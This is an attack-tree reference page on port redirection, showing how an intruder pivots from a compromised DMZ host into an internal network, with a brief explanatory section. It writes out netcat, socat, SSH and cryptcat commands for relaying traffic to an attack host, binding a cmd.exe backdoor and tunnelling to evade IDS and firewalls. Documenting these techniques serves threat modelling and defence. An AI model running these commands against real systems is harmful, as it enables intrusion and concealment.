# Port redirection

## Attack tree

```text
1 Compromise host in DMZ gaining direct access on port 80/tcp only (AND)
2 Compromise host in internal network by setting a bind shell to listen on port 23 (AND)
3 Redirect
    3.1 One way port redirection with netcat (OR)
        3.1.1 On attack host set up to receive response traffic 
                (nc -lv 3333) (AND)
        3.1.2 Redirect on host in DMZ 
                (nc -lv 80 | nc -t [IP address internal host] 23 | nc [IP address attack host] 3333) (AND)
        3.1.3 Initiate connection to host in DMZ on port 80/tcp (nc [IP address DMZ host] 80) (AND)
        3.1.4 Run commands from window created and receive the command response in the other window.
    3.2 Two way redirection using netcat and named pipes (OR)
        3.2.1 Make pipe on attack host (mkfifo pipe) (AND)
        3.2.2 Redirect on host in DMZ 
                (nc -lvp 80 <pipe | nc -t [IP address internal host] 23 >pipe) (AND)
        3.2.3 Initiate a connection to host in DMZ on port 80/tcp 
                (nc [IP address DMZ host] 80 or telnet [IP address DMZ host] 80) (AND)
        3.2.4 Issue commands and receive command output in the same window
    3.3 Redirect traffic from one port to another on the same host (OR)
        3.3.1 Make pipe on attack host (mkfifo pipe) (AND)
        3.3.2 SSH into host in DMZ if sshd is listening on loopback 
                (nc -lvp 80 <pipe | nc localhost 22 >pipe) (AND)
        3.3.3 Connect 
                (ssh -p 80 [IP address DMZ host])
    3.4 Set up two way redirection using socat (OR)
        3.4.1 (socat TCP-LISTEN:80,fork TCP:[IP address internal host]:23)
    3.5 Evade IDS with socat (OR)
        3.5.1 Generate certificates for each host (dmzhost.pem and internalhost.pem) (AND)
            3.5.1.1 Generate a public/private key pair 
                    (openssl genrsa -out [host].key 1024) (AND)
            3.5.1.2 Self sign the certificate 
                    (openssl req -new -key [host].key -x509 -out [host].crt) (AND)
            3.5.1.3 Generate the PEM certificate by concatenating the key and certificate files 
                    (cat [host].key [host].crt > [host].pem) (AND)
            3.5.1.4 Copy the PEM certificate to the host (AND)
        3.5.2 Set up SSL encrypted tunnel on DMZ host to internal host 
                (socat TCP-LISTEN:80, fork openssl-connect:[IP address internal host]:8080,
                cert[dmzhost].pem,cafile=[internalhost].crt)
        3.5.3 Set up listener on internal host 
                (socat openssl-listen:8080,reuseaddr,
                cert=[internalhost].pem,cafile=[dmzhost].crt,fork TCP:localhost:23)
    3.6 Two way tunnel between attack host and internal host using ssh (OR)
        3.6.1 SSH connection with host in DMZ (AND)
        3.6.2 Setup a listener on attack host on port 3333/tcp 
                to forward traffic it receives to the internal host on port 23, via host in DMZ 
                (ssh -L 3333:[internalhost]:23 username@[dmzhost])
    3.7 Bypass IDS using two ssh local forwards (OR)
        3.7.1 SSH connection with host in internal network (AND)
        3.7.2 Login to host in DMZ 
                (ssh -L 3333:localhost:3333 username@[dmzhost]) (AND)
        3.7.3 On DMZ host login to host in internal network 
                (ssh -L 3333:localhost:23 username@[internalhost])
    3.8 Setting up attack host as a proxy between DMZ host and a Service host using ssh remote forward (OR)
        3.8.1 Connect to DMZ host with ssh remote forward and connect to 80/tcp of a Service host via the 
                loopback adapter on the DMZ host (ssh -R 80:[servicehost]:80 username@[dmzhost])
    3.9 Bypass IDS and firewall 
            (port 80 is nearly always open and a little more traffic will hardly be noticed) with cryptcat
        3.9.1 Create backdoor to decrypt communications from DMZ host 
                (cryptcat -k SECRETKEY -tlp 23 -e cmd.exe)
        3.9.2 Create named pipes on host in DMZ and attack host
        3.9.3 Create tunnel on host in DMZ 
                (cryptcat -k SECRETKEY -lp 80 <pipe | cryptcat -k SECRETKEY -t [internalhost] 23 >pipe)
        3.9.4 Create listener on attack host to encrypt the traffic to DMZ host 
                (cryptcat -k SECRETKEY -lvp 23 <pipe | cryptcat -k SECRETKEY -t [dmzhost] 80 >pipe)
        3.9.5 Initiate a telnet connection to local forwarder 
                (telnet localhost 23)
```

## Notes

In port redirection, an adversary uses a machine with access to the internal network to pass traffic through a port on the firewall or access control list (ACL). The port in question normally denies traffic, but with redirection a hacker can bypass security measures and open a tunnel for communication.

For example,  most organisations have a demilitarized zone (DMZ). Servers that communicate from the DMZ and the internal network may have a trust relationship established. The internal devices may be set up to trust information that is received from a DMZ server, and often also vv. When an adversary can compromise a DMZ server she can initiate a connection to the internal network. There are a lot of ways that port redirection can be used to get around obstacles.

* Leverage network access by compromising one system to attack another.
* Access a service that is being blocked by a firewall.
* Evading an intrusion detection system by sending traffic through an encrypted tunnel.

